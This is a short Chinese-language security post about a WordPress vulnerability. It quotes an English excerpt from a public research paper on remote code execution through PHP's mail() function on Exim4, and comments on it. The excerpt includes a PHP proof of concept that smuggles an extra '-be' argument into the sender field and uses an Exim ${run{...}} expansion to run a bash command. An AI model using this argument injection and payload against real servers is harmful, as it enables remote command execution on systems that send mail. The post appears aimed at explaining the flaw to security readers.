wordpress这个漏洞另外一个点是关于mail函数的命令执行，作者已经分析得非常清楚，其实最早十几年前剑心的文章就说过了。这次的关键点在下面，mail函数的参数支持可变变量也叫动态变量的执行，大家细读完三篇，对这个漏洞的理解应该就会差不多了，不过我也没有细读，太久没有搞web安全了，完全凭经验，有疏漏的地方就不用揪着了~ ：）

<e type="web" href="https%3A%2F%2Fexploitbox.io%2Fpaper%2FPwning-PHP-Mail-Function-For-Fun-And-RCE.html" title="https%3A%2F%2Fexploitbox.io%2Fpaper%2FPwning-PHP-Mail-Functi..." cache="http%3A%2F%2Fcache.xiaomiquan.com%2F201705%2Fa9522d0f5d35f552df8595e36bb704fbf7be93e956ad8a8cce2c43b811c2fea3"/>

Further research however uncovered ${run} which can be expanded to return
a result of a shell command.

For example, the following string: 

${run{/bin/true}{yes}{no}}

would be expanded to 'yes' upon successful execution of /bin/true.

This was quickly turned into Arbitrary Remote Code Execution payload
which would execute arbitrary shell command passed within $body of the
message:

<?php
// RCE via mail() vector on Exim4 MTA
// Attacker's cmd is passed on STDIN by mail() within $body
// Discovered by:
// Dawid Golunski - @dawid_golunski - <e type="web" href="https%3A%2F%2Flegalhackers.com" title="Legal%2Fethical+hacking.+Information+security." cache="http%3A%2F%2Fcache.xiaomiquan.com%2F201705%2Fa3f2715715f638ece9b0ed9de0e6e4060500eeec81d14ffd5e40a4a599ccf06e"/>

        $sender = "attacker@anyhost -be";
        $body   = 'Exec: ${run{/bin/bash -c "/usr/bin/id
>/tmp/id"}{yes}{no}}';
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $to = "john@localhost";
        $subject = "Exim RCE PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>
